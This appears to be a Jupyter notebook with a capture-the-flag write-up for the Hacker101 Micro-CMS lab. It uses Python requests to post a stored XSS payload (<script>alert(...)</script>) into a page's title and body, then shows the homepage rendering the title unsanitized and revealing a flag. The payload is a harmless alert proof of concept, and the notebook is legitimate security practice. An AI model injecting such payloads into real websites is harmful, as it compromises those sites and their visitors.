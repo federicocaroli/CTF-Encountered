{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests, time\n",
    "\n",
    "url = \"https://2155e7292db5f7b30e663b3aee95c7e8.ctf.hacker101.com/\" # Home page\n",
    "\n",
    "session = requests.Session()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get the homepage"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "<!doctype html>\n",
      "<html>\n",
      "    <head>\n",
      "        <title>Micro-CMS</title>\n",
      "    </head>\n",
      "    <body>\n",
      "        <ul>\n",
      "<li><a href=\"page/1\">Testing</a></li>\n",
      "<li><a href=\"page/2\">Markdown Test</a></li>\n",
      "        </ul>\n",
      "        <a href=\"page/create\">Create a new page</a>\n",
      "    </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "response = session.get(url)\n",
    "print(response.text)\n",
    "\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\">Testing</a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I try to access the \"Testing page\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "<!doctype html>\n",
      "<html>\n",
      "    <head>\n",
      "        <title>Testing</title>\n",
      "    </head>\n",
      "    <body>\n",
      "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
      "        <a href=\"edit/1\">Edit this page</a>\n",
      "        <h1>Testing</h1>\n",
      "<h1>Woo</h1>\n",
      "<p>Testing out this new micro-CMS!</p>\n",
      "    </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "response = session.get(url + \"page/1\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Testing</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/1\">Edit this page</a>\n",
    "        <h1>Testing</h1>\n",
    "<h1>Woo</h1>\n",
    "<p>Testing out this new micro-CMS!</p>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "I am able to edit the page's content. I try to inject script tag both in the title and the body -> **Stored XSS**\n",
    "\n",
    "New title: ```<script>alert(1);</script>```\n",
    "New body: ```<script>alert(2);</script>```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200\n",
      "\n",
      "<!doctype html>\n",
      "<html>\n",
      "    <head>\n",
      "        <title>&lt;script&gt;alert(1);&lt;/script&gt;</title>\n",
      "    </head>\n",
      "    <body>\n",
      "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
      "        <a href=\"edit/1\">Edit this page</a>\n",
      "        <h1>&lt;script&gt;alert(1);&lt;/script&gt;</h1>\n",
      "<scrubbed>alert(2);</scrubbed>\n",
      "    </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "response = session.post(url + \"page/edit/1\", data= {\"title\": \"<script>alert(1);</script>\", \"body\": \"<script>alert(2);</script>\"}, headers={\"Content-Type\": \"application/x-www-form-urlencoded\", 'User-Agent': 'Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.109 Safari/537.36 CrKey/1.54.248666'})\n",
    "time.sleep(1) # Wait for 1 second\n",
    "\n",
    "response = requests.get(url + \"page/1\")\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>&lt;script&gt;alert(1);&lt;/script&gt;</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <a href=\"../\">&lt;-- Go Home</a><br>\n",
    "        <a href=\"edit/1\">Edit this page</a>\n",
    "        <h1>&lt;script&gt;alert(1);&lt;/script&gt;</h1>\n",
    "\t<scrubbed>alert(2);</scrubbed>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "Unluckily, the injected code has not been executed in the \"/page/1\". However, even if the body has been correctly sanitized, the title still contains the encoded versions of < >. So, the < > are still there, but in a different format. Moreover, I can see through DevTools that the web site does not include any CSP directive.\n",
    "\n",
    "I want to try what is going to be showed in the homepage (considering that I changed the title of the testing page)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "<!doctype html>\n",
      "<html>\n",
      "    <head>\n",
      "        <title>Micro-CMS</title>\n",
      "    </head>\n",
      "    <body>\n",
      "        <ul>\n",
      "<li><a href=\"page/1\"><script>alert(\"^FLAG^eeed36e5fdc5a8d74ffa3742142f7a42f6374ed2ea9c5e454419189b643b41a5$FLAG$\");</script><script>alert(1);</script></a></li>\n",
      "<li><a href=\"page/2\">Markdown Test</a></li>\n",
      "        </ul>\n",
      "        <a href=\"page/create\">Create a new page</a>\n",
      "    </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "response = requests.get(url)\n",
    "print(response.text)\n",
    "time.sleep(1) # Wait for 1 second"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Response:\n",
    "```html\n",
    "<!doctype html>\n",
    "<html>\n",
    "    <head>\n",
    "        <title>Micro-CMS</title>\n",
    "    </head>\n",
    "    <body>\n",
    "        <ul>\n",
    "<li><a href=\"page/1\"><script>alert(\"^FLAG^...$FLAG$\");</script><script>alert(1);</script></a></li>\n",
    "<li><a href=\"page/2\">Markdown Test</a></li>\n",
    "        </ul>\n",
    "        <a href=\"page/create\">Create a new page</a>\n",
    "    </body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "YES! The sanitation of the homepage is not implemented! One flag caught!\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "TO BE CONTINUED......"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "microlog",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
